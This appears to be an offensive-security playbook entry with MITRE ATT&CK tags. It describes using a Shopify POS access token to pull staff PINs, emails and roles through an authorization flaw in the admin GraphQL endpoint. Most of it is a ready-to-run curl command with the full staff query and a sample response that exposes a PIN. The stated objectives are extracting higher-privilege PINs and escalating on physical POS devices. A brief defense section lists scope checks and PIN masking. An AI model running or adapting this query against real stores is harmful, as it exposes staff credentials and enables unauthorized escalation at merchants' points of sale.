---
id: proc-disclose-pins-graphql-001
tags:
  - shopify
  - graphql
  - information-disclosure
  - pins
  - account-discovery
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/shopify-graphql-staff-query]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:17.916Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Disclose-Staff-PINs-via-GraphQL

## Summary

This procedure uses a POS access token to query Shopify's GraphQL API for staff member details, disclosing sensitive information like PINs that enable privilege escalation on physical POS devices.

## Description

With the persistent token, a POST to /admin/api/unversioned/graphql executes a StaffList query fetching up to 100 staff members' data, including PINs, emails, and roles. Inadequate authorization allows low-priv tokens to access this, bypassing expected controls. This exploits the GraphQL endpoint in Shopify's API.

## Requirements

1. Valid POS access_token from prior procedure
2. GraphQL query payload prepared
3. API client supporting headers and JSON

## Defense

Defensive measures and detection strategies:

- Enforce token scope checks on GraphQL resolvers
- Rate-limit and audit GraphQL queries for sensitive fields
- Mask or restrict PIN exposure in API responses

## Objectives

1. Retrieve unauthorized staff sensitive data
2. Extract PINs for higher-privilege users
3. Facilitate physical POS escalation

## Instructions

### Step 1: Prepare GraphQL Query

**Context**: Define the query fragments for StaffMember and variables to fetch all updated staff.

Use query: StaffList with fragments for RemoteStaffMember, RemoteRetailRole, etc. Variables: {"first":100,"query":"updated_at:>1970-01-01T00:00:00Z"}.

### Step 2: Execute GraphQL POST

**Context**: Send the query with token header to disclose data.

**Command** ([[commands/shopify-graphql-staff-query]]):
```bash
curl -X POST https://h1-2102-ramsexy.myshopify.com/admin/api/unversioned/graphql \
  -H "Content-Type: application/json" \
  -H "X-Shopify-Access-Token: shpat_..." \
  -d '{"query":"fragment RemoteStaffMember on StaffMember { __typename active email name firstName lastName phone pin id isShopOwner accountType permissions { __typename userPermissions } privateData { __typename updatedAt identityOwned identityUuid } retailData(location: $locationID) { __typename canInitializePos posAccess retailRole { __typename ... RemoteRetailRole } } } fragment RemoteRetailRole on RetailRole { __typename id name isDefault: default hidden updatedAt retailRolePermissions { __typename ... RemoteRetailRolePermission } } fragment RemoteRetailRolePermission on RetailRolePermission { __typename access retailPermissionTag } query StaffList($first: Int, $after: String, $query: String, $locationID: ID) { __typename shop { __typename staffMembers(first: $first, after: $after, query: $query) { __typename edges { __typename node { __typename ... RemoteStaffMember } cursor } pageInfo { __typename hasNextPage } } } }","variables":{"first":100,"query":"updated_at:>1970-01-01T00:00:00Z"}}'
```

> This queries for staff details; replace token with obtained value.

**Expected Output**: {"data":{"shop":{"staffMembers":{"edges":[{"node":{"pin":"3333","email":"...",...}}]}}}

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/shopify-graphql-staff-query]]

## Tools Used


## Tags

- shopify
- graphql
- disclosure
